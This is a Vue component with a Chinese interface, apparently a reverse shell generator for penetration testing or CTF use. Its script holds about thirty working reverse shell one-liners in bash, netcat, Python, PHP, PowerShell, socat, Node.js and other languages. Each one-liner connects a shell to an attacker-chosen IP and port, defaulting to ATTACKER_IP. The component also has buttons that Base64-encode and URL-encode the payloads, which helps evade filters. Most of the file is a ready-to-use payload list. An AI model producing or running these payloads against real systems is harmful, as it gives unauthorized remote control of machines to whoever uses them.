<template>
  <div class="space-y-4">
    <div class="grid grid-cols-3 gap-3">
      <div>
        <label class="text-xs font-medium block mb-1" style="color: var(--color-text-secondary);">IP 地址</label>
        <input
          v-model="ip"
          type="text"
          placeholder="10.10.10.10"
          class="w-full rounded-md border px-3 py-2 text-sm font-mono focus:outline-none"
          style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
        />
      </div>
      <div>
        <label class="text-xs font-medium block mb-1" style="color: var(--color-text-secondary);">端口</label>
        <input
          v-model="port"
          type="text"
          placeholder="1337"
          class="w-full rounded-md border px-3 py-2 text-sm font-mono focus:outline-none"
          style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
        />
      </div>
      <div>
        <label class="text-xs font-medium block mb-1" style="color: var(--color-text-secondary);">Shell</label>
        <select
          v-model="shell"
          class="w-full rounded-md border px-3 py-2 text-sm focus:outline-none"
          style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
        >
          <option value="/bin/sh">/bin/sh</option>
          <option value="/bin/bash">/bin/bash</option>
          <option value="bash">bash</option>
          <option value="sh">sh</option>
          <option value="cmd">cmd (Windows)</option>
          <option value="powershell">powershell</option>
          <option value="pwsh">pwsh</option>
        </select>
      </div>
    </div>

    <div class="flex items-center gap-3">
      <input
        v-model="searchText"
        type="text"
        placeholder="搜索 shell 类型..."
        class="flex-1 rounded-md border px-3 py-2 text-sm focus:outline-none"
        style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
      />
      <select
        v-model="filterTag"
        class="rounded-md border px-3 py-2 text-sm focus:outline-none"
        style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
      >
        <option value="">全部</option>
        <option value="linux">Linux</option>
        <option value="mac">macOS</option>
        <option value="windows">Windows</option>
      </select>
    </div>

    <div class="space-y-2">
      <div
        v-for="(item, idx) in filteredShells"
        :key="idx"
        class="reveal-item rounded-md border p-3"
        :style="{ '--i': Math.min(idx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
      >
        <div class="flex items-center justify-between gap-2 mb-2">
          <div class="flex items-center gap-2">
            <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.name }}</span>
            <span
              v-for="tag in item.tags"
              :key="tag"
              class="text-xs px-1.5 py-0.5 rounded"
              :style="{ color: '#fff', backgroundColor: tagColor(tag) }"
            >{{ tag }}</span>
          </div>
          <CopyButton :text="item.resolved" />
        </div>
        <pre
          class="text-xs font-mono overflow-x-auto p-2 rounded"
          style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;"
        >{{ item.resolved }}</pre>
        <div class="flex flex-wrap items-center gap-1.5 mt-2 pt-2 border-t" style="border-color: var(--color-border);">
          <span class="text-xs" style="color: var(--color-text-muted);">编码:</span>
          <button
            @click="copyEncoded(item.resolved, 'base64')"
            class="text-xs px-1.5 py-0.5 rounded border"
            style="color: var(--color-text-muted); border-color: var(--color-border);"
          >Base64</button>
          <button
            @click="copyEncoded(item.resolved, 'url')"
            class="text-xs px-1.5 py-0.5 rounded border"
            style="color: var(--color-text-muted); border-color: var(--color-border);"
          >URL编码</button>
          <button
            @click="copyEncoded(item.resolved, 'double-url')"
            class="text-xs px-1.5 py-0.5 rounded border"
            style="color: var(--color-text-muted); border-color: var(--color-border);"
          >双重URL编码</button>
        </div>
      </div>

      <div v-if="filteredShells.length === 0" class="text-center py-4">
        <p class="text-xs" style="color: var(--color-text-muted);">没有匹配的 Shell</p>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, computed } from 'vue';
import CopyButton from '../../common/CopyButton.vue';

const ip = ref('');
const port = ref('');
const shell = ref('/bin/sh');
const searchText = ref('');
const filterTag = ref('');

interface ShellItem {
  name: string;
  command: string;
  tags: string[];
}

const shells: ShellItem[] = [
  { name: 'Bash -i', command: '{shell} -i >& /dev/tcp/$IP/$PORT 0>&1', tags: ['linux', 'mac'] },
  { name: 'Bash 196', command: '0<&196;exec 196<>/dev/tcp/$IP/$PORT; {shell} <&196 >&196 2>&196', tags: ['linux', 'mac'] },
  { name: 'Bash read line', command: 'exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done', tags: ['linux', 'mac'] },
  { name: 'Bash 5', command: '{shell} -i 5<> /dev/tcp/$IP/$PORT 0<&5 1>&5 2>&5', tags: ['linux', 'mac'] },
  { name: 'Bash UDP', command: '{shell} -i >& /dev/udp/$IP/$PORT 0>&1', tags: ['linux', 'mac'] },
  { name: 'Netcat mkfifo', command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc $IP $PORT >/tmp/f', tags: ['linux', 'mac'] },
  { name: 'Netcat -e', command: 'nc $IP $PORT -e {shell}', tags: ['linux', 'mac'] },
  { name: 'Netcat.exe -e', command: 'nc.exe $IP $PORT -e {shell}', tags: ['windows'] },
  { name: 'Netcat -c', command: 'nc -c {shell} $IP $PORT', tags: ['linux', 'mac'] },
  { name: 'Ncat -e', command: 'ncat $IP $PORT -e {shell}', tags: ['linux', 'mac'] },
  { name: 'Ncat.exe -e', command: 'ncat.exe $IP $PORT -e {shell}', tags: ['windows'] },
  { name: 'Ncat UDP', command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u $IP $PORT >/tmp/f', tags: ['linux', 'mac'] },
  { name: 'Perl', command: `perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'`, tags: ['linux', 'mac'] },
  { name: 'Python #1', command: `export RHOST="$IP";export RPORT=$PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'`, tags: ['linux', 'mac'] },
  { name: 'Python #2', command: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'`, tags: ['linux', 'mac'] },
  { name: 'Python3 #1', command: `export RHOST="$IP";export RPORT=$PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'`, tags: ['linux', 'mac'] },
  { name: 'Python3 shortest', command: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$IP",$PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'`, tags: ['linux'] },
  { name: 'Ruby #1', command: `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$IP",$PORT))'`, tags: ['linux', 'mac'] },
  { name: 'PHP', command: `php -r '$sock=fsockopen("$IP",$PORT);exec("{shell} <&3 >&3 2>&3");'`, tags: ['linux', 'mac'] },
  { name: 'PHP exec', command: `php -r '$sock=fsockopen("$IP",$PORT);$proc=proc_open("{shell}",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`, tags: ['linux', 'mac', 'windows'] },
  { name: 'PowerShell #1', command: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$IP",$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, tags: ['windows'] },
  { name: 'PowerShell #2', command: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`, tags: ['windows'] },
  { name: 'Socat #1', command: 'socat TCP:$IP:$PORT EXEC:{shell}', tags: ['linux', 'mac'] },
  { name: 'Socat #2 (TTY)', command: `socat TCP:$IP:$PORT EXEC:'{shell}',pty,stderr,setsid,sigint,sane`, tags: ['linux', 'mac'] },
  { name: 'Node.js', command: `require('child_process').exec('nc -e {shell} $IP $PORT')`, tags: ['linux', 'mac'] },
  { name: 'Node.js #2', command: `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("{shell}",[]);var client=new net.Socket();client.connect($PORT,"$IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)});return /a/;})();`, tags: ['linux', 'mac', 'windows'] },
  { name: 'Java #1', command: `Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/$IP/$PORT 0>&1")`, tags: ['linux', 'mac'] },
  { name: 'Telnet', command: 'TF=$(mktemp -u);mkfifo $TF && telnet $IP $PORT 0<$TF | {shell} 1>$TF', tags: ['linux', 'mac'] },
  { name: 'Zsh', command: 'zsh -c "zmodload zsh/net/tcp && ztcp $IP $PORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY"', tags: ['linux', 'mac'] },
  { name: 'Awk', command: `awk 'BEGIN{s="/inet/tcp/0/$IP/$PORT";while(1){do{printf"$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!="exit")}}'`, tags: ['linux', 'mac'] },
  { name: 'Lua', command: `lua -e 'require("socket");require("os");t=socket.tcp();t:connect("$IP","$PORT");os.execute('{shell} <&3 >&3 2>&3");'`, tags: ['linux', 'mac'] },
];

const filteredShells = computed(() => {
  return shells.filter(item => {
    if (filterTag.value && !item.tags.includes(filterTag.value)) return false;
    if (searchText.value) {
      const q = searchText.value.toLowerCase();
      return item.name.toLowerCase().includes(q) || item.command.toLowerCase().includes(q);
    }
    return true;
  }).map(item => ({
    ...item,
    resolved: resolveCommand(item.command),
  }));
});

function resolveCommand(cmd: string): string {
  return cmd
    .replace(/\$IP/g, ip.value || 'ATTACKER_IP')
    .replace(/\$PORT/g, port.value || 'PORT')
    .replace(/\{shell\}/g, shell.value);
}

function tagColor(tag: string): string {
  switch (tag) {
    case 'linux': return '#e85d26';
    case 'mac': return '#2ea44f';
    case 'windows': return '#2563eb';
    default: return '#6b7280';
  }
}

function copyEncoded(text: string, type: string) {
  let encoded = '';
  switch (type) {
    case 'base64':
      try { encoded = btoa(unescape(encodeURIComponent(text))); } catch { encoded = btoa(text); }
      break;
    case 'url':
      encoded = encodeURIComponent(text);
      break;
    case 'double-url':
      encoded = encodeURIComponent(encodeURIComponent(text));
      break;
  }
  navigator.clipboard.writeText(encoded);
}
</script>
